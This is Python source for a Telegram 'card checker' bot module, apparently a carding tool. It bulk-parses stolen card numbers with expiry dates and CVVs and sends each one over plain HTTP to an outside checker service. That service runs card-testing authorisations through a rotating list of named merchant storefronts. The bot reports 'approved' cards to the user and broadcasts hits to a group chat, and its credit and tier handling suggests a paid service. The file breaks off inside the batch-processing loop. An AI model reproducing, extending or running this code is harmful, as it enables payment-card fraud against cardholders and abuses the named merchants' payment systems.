import re
import logging
import random
import json
from typing import Optional, Dict, List, Tuple
from bin import get_bin_info
from database import get_or_create_user, update_user_credits, get_user_credits, get_random_user_proxy, get_user_proxies
from plans import get_user_current_tier
from datetime import datetime, timedelta
import asyncio
import aiohttp
import io
import time
import string
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import CallbackContext
from telegram.error import TimedOut, BadRequest

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Dictionary to store active mass check processes for mau only
active_mass_checks = {}

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Dictionary to track user message sending rate (to prevent spamming)
user_message_rates = {}

# Group ID for hit detection notifications
HIT_DETECTION_GROUP_ID = -1003838614236  # Replace with your actual group ID

# UPDATED: List of sites for API rotation
MAU_SITES = [
    "babyboom.ie",          # Primary
    "dominileather.com",
    "girlslivingwell.com",
    "shop.wattlogic.com",
    "dutchwaregear.com",
    "mjuniqueclosets.com",
    "peeteescollection.com",
    "2poundstreet.com",
    "sockbox.com"
]

def generate_session_id(length=8):
    """Generate a random session ID."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def luhn_check(card_number: str) -> bool:
    """
    Validate a credit card number using the Luhn algorithm.
    
    Args:
        card_number: The credit card number to validate
        
    Returns:
        True if card number is valid, False otherwise
    """
    # Remove any spaces or dashes from the card number
    card_number = card_number.replace(' ', '').replace('-', '')
    
    # Check if the card number contains only digits
    if not card_number.isdigit():
        return False
    
    # Check if the card number has a valid length (13-19 digits)
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert the card number to a list of integers
    digits = [int(d) for d in card_number]
    
    # Starting from the rightmost digit, double every second digit
    # If doubling results in a two-digit number, sum the digits
    for i in range(len(digits) - 2, -1, -2):
        digits[i] = digits[i] * 2
        if digits[i] > 9:
            digits[i] = digits[i] % 10 + 1
    
    # Sum all the digits
    total = sum(digits)
    
    # If the total is a multiple of 10, the card number is valid
    return total % 10 == 0

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: /mass 4296190000711410|08|30|545
        r'^\/[a-zA-Z]+\s+(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: /mass 4296190000711410/08/30/545
        r'^\/[a-zA-Z]+\s+(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: /mass 4296190000711410:08:30:545
        r'^\/[a-zA-Z]+\s+(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern for card details anywhere in text (not at start)
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern for card details anywhere in text (not at start)
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern for card details anywhere in text (not at start)
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            # For patterns with command prefix, we need to adjust groups
            if pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                # Skip first group (command) and get card details
                groups = match.groups()
                if len(groups) == 4:
                    card_number, month, year, cvv = groups
                else:
                    continue
            else:
                # For patterns without command prefix, get all groups
                groups = match.groups()
                if len(groups) == 4:
                    card_number, month, year, cvv = groups
                else:
                    continue
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def extract_cards_from_text(text: str) -> List[str]:
    """
    Extract only valid card details from text, ignoring other content.
    
    Args:
        text: String containing multiple card details and other text
        
    Returns:
        List of card strings
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30|545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                
                # Normalize month (ensure it's 2 digits)
                month = month.zfill(2)
                
                # Normalize year (if it's 4 digits, take last 2)
                if len(year) == 4:
                    year = year[2:]
                
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:  # Avoid duplicates
                    cards.append(card_string)
    
    # Limit to 1500 cards
    return cards[:1500]

async def check_card(card_details: str, user_info: Dict, stop_event: asyncio.Event = None) -> Optional[Dict]:
    """
    Check a single card using the Stripe Auth API with site rotation.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        stop_event: Event to check if process should be stopped
        
    Returns:
        Dictionary with card details and API response or None if there was an error
    """
    # Check if we should stop before making API call
    if stop_event and stop_event.is_set():
        logger.info(f"Process stopped before checking card {card_details[:6]}******")
        return None
    
    # Parse card details
    parsed = parse_card_details(card_details)
    if not parsed:
        logger.error(f"Failed to parse card details: {card_details}")
        return {
            "card_details": card_details,
            "error": "Invalid card format"
        }
    
    card_number, month, year, cvv = parsed
    
    # Validate the card number using Luhn algorithm
    if not luhn_check(card_number):
        logger.error(f"Card failed Luhn check: {card_number}")
        return {
            "card_details": card_details,
            "error": "Invalid card number (failed Luhn check)",
            "is_luhn_failed": True
        }
    
    # Get BIN information using imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Format the card details for the API
    formatted_card = f"{card_number}|{month}|{year}|{cvv}"
    
    # --- FIX START: Session Management & Timeout ---
    
    # Timeout settings (90s total)
    timeout = aiohttp.ClientTimeout(total=90, connect=30)
    
    # Connector settings
    # ssl=False: Disables SSL verification (required for HTTP)
    # force_close=False: Allows connection reuse (better performance)
    # limit=100: Pool size
    connector = aiohttp.TCPConnector(ssl=False, force_close=False, limit=100)

    # Headers (Defined once to save resources)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }

    # --- FIX: Create ONE session OUTSIDE the site loop to prevent socket churn ---
    async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
        
        # Loop through MAU_SITES to find a working one
        for site in MAU_SITES:
            # Check if we should stop before processing
            if stop_event and stop_event.is_set():
                logger.info(f"Process stopped before API call for card {card_details[:6]}******")
                return None
            
            # CRITICAL FIX: Using HTTP instead of HTTPS.
            # "Connection closed" often means the client is trying to speak HTTPS to an HTTP server.
            api_url = f"http://stripe.nikhilkhokhar.com/?site={site}&cc={formatted_card}&key=inferno"
            
            try:
                # Make the API request
                async with session.get(api_url, skip_auto_headers=['Accept-Encoding']) as response:
                    
                    # Check if we should stop after getting response
                    if stop_event and stop_event.is_set():
                        logger.info(f"Process stopped after API response for card {card_details[:6]}******")
                        return None
                    
                    if response.status != 200:
                        # Try next site on HTTP error
                        logger.warning(f"HTTP {response.status} on site {site} for card {card_details[:6]}******. Retrying next site.")
                        continue
                    
                    # --- CRITICAL FIX START: Read JSON INSIDE the context block ---
                    # The connection is only open inside this 'async with' block.
                    # Reading response.json() outside causes "Connection closed".
                    try:
                        api_response = await response.json()
                    except (json.JSONDecodeError, aiohttp.ContentTypeError) as e:
                        # If response isn't JSON, try next site
                        logger.warning(f"Invalid JSON from site {site} for card {card_details[:6]}******: {e}. Retrying next site.")
                        continue
                    # --- CRITICAL FIX END ---

                    # Check if we got a valid response
                    if not api_response:
                        continue
                    
                    # Extract response fields from new API format
                    status = api_response.get("status", "unknown")
                    message = api_response.get("response", "No response message")
                    
                    # If status is missing or empty, try next site
                    if not status:
                        continue

                    # If we are here, we have a valid response
                    logger.info(f"Card processing result for {card_details[:6]}****** via {site}: Status={status}, Message={message}")
                    
                    return {
                        "card_details": card_details,
                        "card_number": card_number,
                        "month": month,
                        "year": year,
                        "cvv": cvv,
                        "api_response": {
                            "status": status,
                            "response": message
                        },
                        "brand": brand,
                        "issuer": issuer,
                        "country": country_name,
                        "country_flag": country_flag
                    }
            
            except asyncio.TimeoutError:
                logger.warning(f"Timeout (90s) on site {site} for card {card_details[:6]}******. Retrying next site.")
                continue # Try next site
            except aiohttp.ClientError as e:
                # Log specific error for debugging
                logger.warning(f"Network error on site {site} for card {card_details[:6]}******: {e}. Retrying next site.")
                continue
            except Exception as e:
                logger.warning(f"Exception on site {site} for card {card_details[:6]}******: {e}. Retrying next site.")
                continue

    # If all sites failed
    return {
        "card_details": card_details,
        "error": "API request failed on all backup sites"
    }

def format_response_stripe_auth(result: dict, user_info: dict) -> Tuple[str, str]:
    """
    Format the API response into a beautiful message with emojis for Stripe Auth.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if "error" in result:
        error_msg = result.get('error', 'Unknown error')
        
        # Check if this is a Luhn check failure
        is_luhn_failed = result.get('is_luhn_failed', False)
        
        # Create a more visually appealing error message
        formatted_error = f"""<a href='https://t.me/failfr'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙</b> ⚠️

<a href='https://t.me/failfr'>💳</a> <b>𝘾𝙖𝙧𝙙:</b> <code>{result.get('card_details', 'Unknown')}</code>

<a href='https://t.me/failfr'>📝</a> <b>𝙍𝙚𝙖𝙨𝙤𝙣:</b> <i>{error_msg}</i>

<a href='https://t.me/failfr'>💡</a> <b>𝙏𝙞𝙥:</b> <i>Please check your card details and try again.</i>"""
        
        # Return declined status for Luhn check failures
        if is_luhn_failed:
            return formatted_error, "declined"
        return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    
    # Extract response fields
    # New API: status can be "APPROVED", "DECLINED", "ERROR"
    status = api_response.get("status", "")
    
    # New API: 'response' field contains text like "Payment method added."
    message = api_response.get("response", "No response message")
    
    # Determine status style based on status content
    status_lower = status.lower()
    if status_lower == "approved":
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
        status_category = "approved"
    elif status_lower == "declined":
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
        status_category = "declined"
    else:
        status_style = "<b>𝙀𝙍𝙍𝙊𝙍</b> ⚠️"
        status_category = "error"
        
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/failfr'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return formatted_response, status_category

def format_hit_detected_message(result: dict, user_info: dict) -> str:
    """
    Format a hit detected message for group chat.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Formatted string for hit detection message
    """
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    
    # Extract response fields
    status = api_response.get("status", "")
    message = api_response.get("response", "")
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑯𝒊𝒕 𝒅𝒆𝒕𝒆𝒄𝒕𝒆𝒅</b> ↬ <b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅</pre>"""
    
    # Combine all parts
    hit_message = f"""{status_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝚊𝐭𝐞𝐰𝚊𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
<a href='https://t.me/failfr'>⌬</a> <b>𝐔𝐬𝐞𝐫 ↬</b> ↬ {user_link} 
<a href='https://t.me/failfr'>⌬</a> <b>𝐇𝐢𝐭 𝐅𝐫𝐨𝐦</b> ↬ <a href='https://t.me/CARDXCK_BOT'>𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>"""
    
    return hit_message

def format_progress_response(stats: Dict, session_id: str) -> Tuple[str, InlineKeyboardMarkup]:
    """
    Format progress message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        session_id: Session ID for this mass check process
        
    Returns:
        Tuple of (formatted string, inline keyboard markup)
    """
    # Calculate percentage
    percentage = int((stats["checked"] / stats["total"]) * 100) if stats["total"] > 0 else 0
    
    # Create progress message with exact format requested (gateway added above total cards)
    progress_msg = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙿𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐</b> 📊</pre>
<a href='https://t.me/failfr'>⊀</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃</b> ↬ <code>{session_id}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ↬ <code>{stats["checked"]}/{stats["total"]} ({percentage}%)</code>
<a href='https://t.me/failfr'>⊀</a> <b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b> ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["error"]}</code>
<a href='https://t.me/failfr'>⌬</a> <b>𝐒𝐭𝐨𝐩 𝐂𝐨𝐦𝐦𝐚𝐧𝐝</b> ↬ <code>/stop {session_id}</code>
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    # No inline keyboard needed since we're using /stop command
    reply_markup = None
    
    return progress_msg, reply_markup

def format_stopped_response(stats: Dict, elapsed_time: float, user_name: str, session_id: str) -> str:
    """
    Format stopped message with statistics (without stop button).
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with stopped statistics
    """
    # Create stopped message with exact format requested (gateway added above total cards)
    stopped_msg = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙎𝙩𝙤𝙥𝙥𝙚𝙙</b> ⏹️</pre>
<a href='https://t.me/failfr'>⊀</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃</b> ↬ <code>{session_id}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b> ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["error"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝑻𝒊𝒎𝒆</b> ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/failfr'>⌬</a> <b>𝐂𝐡𝐞𝐜𝐤 𝐁𝐲</b> ↬ <code>{user_name}</code>
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return stopped_msg

def format_final_response(stats: Dict, elapsed_time: float, user_name: str, stopped: bool = False, session_id: str = None) -> str:
    """
    Format final results message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of user
        stopped: Whether process was stopped by user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with final statistics
    """
    # Create final message with exact format requested (gateway added above total cards)
    if stopped:
        status_text = "<b>𝙎𝙩𝙤𝙥𝙥𝙚𝙙</b> ⏹️"
        header_text = "𝑺𝒕𝒂𝒕𝒖𝒔"
    else:
        status_text = "<b>𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙</b> ✅"
        header_text = "𝑴𝒐𝒎𝒎𝒂𝒓𝒚"
    
    final_msg = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>{header_text}</b> ↬ {status_text}</pre>
<a href='https://t.me/failfr'>⊀</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃</b> ↬ <code>{session_id if session_id else 'N/A'}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b> ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["error"]}</code>
<a href='https://t.me/failfr'>⊀</a> <b>𝑻𝒊𝒎𝒆</b> ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/failfr'>⌬</a> <b>𝐂𝐡𝐞𝐜𝐤 𝐁𝐲</b> ↬ <code>{user_name}</code>
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return final_msg

async def safe_send_message(context, chat_id, text, reply_markup=None, parse_mode="HTML", retries=3):
    """
    Safely send a message with retries to handle timeouts.
    
    Args:
        context: Telegram context object
        chat_id: ID of chat to send message to
        text: Message text to send
        reply_markup: Optional reply markup
        parse_mode: Parse mode for message
        retries: Number of retry attempts
        
    Returns:
        Message object or None if all retries failed
    """
    for attempt in range(retries):
        try:
            return await context.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except TimedOut:
            if attempt < retries - 1:
                await asyncio.sleep(2)  # Wait before retrying
                continue
            logger.error(f"Failed to send message after {retries} attempts due to timeout")
            return None
        except Exception as e:
            logger.error(f"Error sending message: {str(e)}")
            return None

async def safe_edit_message_text(context, chat_id, message_id, text, reply_markup=None, parse_mode="HTML", retries=3):
    """
    Safely edit a message with retries to handle timeouts.
    
    Args:
        context: Telegram context object
        chat_id: ID of chat containing message
        message_id: ID of message to edit
        text: New message text
        reply_markup: Optional reply markup
        parse_mode: Parse mode for message
        retries: Number of retry attempts
        
    Returns:
        Message object or None if all retries failed
    """
    for attempt in range(retries):
        try:
            return await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except TimedOut:
            if attempt < retries - 1:
                await asyncio.sleep(2)  # Wait before retrying
                continue
            logger.error(f"Failed to edit message after {retries} attempts due to timeout")
            return None
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # This is not an error, just return the message
                return await context.bot.get_message(chat_id=chat_id, message_id=message_id)
            logger.error(f"Error editing message: {str(e)}")
            return None
        except Exception as e:
            logger.error(f"Error editing message: {str(e)}")
            return None

async def safe_answer_callback_query(context, callback_query_id, text=None, show_alert=False, retries=3):
    """
    Safely answer a callback query with retries to handle timeouts.
    
    Args:
        context: Telegram context object
        callback_query_id: ID of callback query to answer
        text: Optional text to show
        show_alert: Whether to show as an alert
        retries: Number of retry attempts
        
    Returns:
        True if successful, False otherwise
    """
    for attempt in range(retries):
        try:
            await context.bot.answer_callback_query(
                callback_query_id=callback_query_id,
                text=text,
                show_alert=show_alert
            )
            return True
        except TimedOut:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            logger.error(f"Failed to answer callback query after {retries} attempts due to timeout")
            return False
        except Exception as e:
            logger.error(f"Error answering callback query: {str(e)}")
            return False

async def update_progress_message(context, update, stats, session_id):
    """
    Update the progress message with current statistics.
    
    Args:
        context: Telegram context object
        update: Telegram update object
        stats: Dictionary containing statistics
        session_id: Session ID for this mass check process
    """
    try:
        # Get the active check data
        if session_id not in active_mass_checks:
            return
            
        active_check = active_mass_checks[session_id]
        chat_id = active_check.get("chat_id")
        message_id = active_check.get("message_id")
        
        if not chat_id or not message_id:
            return
            
        # Format progress message
        progress_msg, _ = format_progress_response(stats, session_id)
        
        # Update the message
        await safe_edit_message_text(
            context,
            chat_id,
            message_id,
            progress_msg
        )
        
        # Update last progress time
        active_check["last_progress_update"] = time.time()
        
    except Exception as e:
        logger.error(f"Error updating progress message: {str(e)}")

async def process_mass_check(cards: List[str], user_info: Dict, update, context):
    """
    Process mass check in background with parallel card processing (Batch of 5).
    
    Args:
        cards: List of cards to check
        user_info: Dictionary containing user information
        update: Telegram update object
        context: Telegram context object
    """
    user_id = user_info.get("id")
    first_name = user_info.get("first_name")
    
    # Generate a unique session ID
    session_id = generate_session_id()
    
    logger.info(f"Starting mau mass check for user {user_id} with session ID {session_id} and {len(cards)} cards")
    
    # Initialize counters
    stats = {
        "total": len(cards),
        "checked": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    }
    
    # Record start time
    start_time = time.time()
    
    # Create a stop event for this process
    stop_event = asyncio.Event()
    
    # Create a stop flag for this user with additional information - SPECIFIC TO MAU
    active_mass_checks[session_id] = {
        "stopped": False,
        "task": None,
        "message_id": None,
        "start_time": start_time,
        "stats": stats,  # Store stats reference
        "last_progress_update": 0,  # Track when progress was last updated
        "stop_event": stop_event,  # Add stop event for immediate cancellation
        "session_id": session_id,  # Add session ID
        "user_id": user_id,  # Add user ID for permission checking
        "chat_id": update.effective_chat.id  # Add chat_id for message editing
    }
    
    # Create initial progress message with requested format
    progress_msg, reply_markup = format_progress_response(stats, session_id)
    
    # Try to send initial progress message with retries
    checking_message = None
    for attempt in range(3):  # Try up to 3 times
        try:
            checking_message = await update.message.reply_text(
                progress_msg,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            if checking_message:
                break
        except TimedOut:
            if attempt < 2:  # Don't wait on last attempt
                await asyncio.sleep(1)
                continue
            logger.error(f"Failed to send initial progress message after {attempt + 1} attempts due to timeout")
        except Exception as e:
            logger.error(f"Error sending initial progress message: {str(e)}")
            if attempt < 2:  # Don't wait on last attempt
                await asyncio.sleep(1)
                continue
    
    # If we couldn't send message after 3 attempts, stop process
    if not checking_message:
        logger.error(f"Failed to send initial progress message after 3 attempts for user {user_id}")
        if session_id in active_mass_checks:
            del active_mass_checks[session_id]
        return
    
    # Store message ID for later editing
    active_mass_checks[session_id]["message_id"] = checking_message.message_id
    
    # UPDATED: Process cards in batches of 5 (Parallel)
    try:
        # Define batch size
        BATCH_SIZE = 5
        
        # Calculate total batches
        total_batches = (len(cards) + BATCH_SIZE - 1) // BATCH_SIZE
        
        for i in range(0, len(cards), BATCH_SIZE):
            # Check if process has been stopped
            if stop_event and stop_event.is_set():
                logger.info(f"Process stopped before batch {i//BATCH_SIZE}")
                break
            
            # Get batch of cards
            batch = cards[i:i + BATCH_SIZE]
            
            # Create tasks for this batch
            tasks = []
            for card in batch:
                tasks.append(check_card(card, user_info, stop_event))
            
            # Run tasks in parallel (wait for all 5 to finish)
            results = await asyncio.gather(*tasks)
            
            # Process results
            for result in results:
                # Check if process was stopped during processing
                if stop_event and stop_event.is_set():
                    break
                
                # Check if result is valid
                if not result:
                    stats["error"] += 1
                    stats["checked"] += 1
                    continue
                
                # Format response
                formatted_response, status_category = format_response_stripe_auth(result, user_info)
                
                # Update stats
                stats["checked"] += 1
                if status_category == "approved":
                    stats["approved"] += 1
                    # Send approved result immediately to user's DM
                    try:
                        await safe_send_message(context, user_info.get("id"), formatted_response)
                        logger.info(f"Sent approved result to user {user_info.get('id')} for card {result.get('card_details', '')[:6]}******")
                        
                        # Send hit detection message to group for approved cards
                        try:
                            hit_message = format_hit_detected_message(result, user_info)
                            await safe_send_message(context, HIT_DETECTION_GROUP_ID, hit_message)
                            logger.info(f"Sent hit detection to group for approved card {result.get('card_details', '')[:6]}******")
                        except Exception as e:
                            logger.error(f"Error sending hit detection to group: {str(e)}")
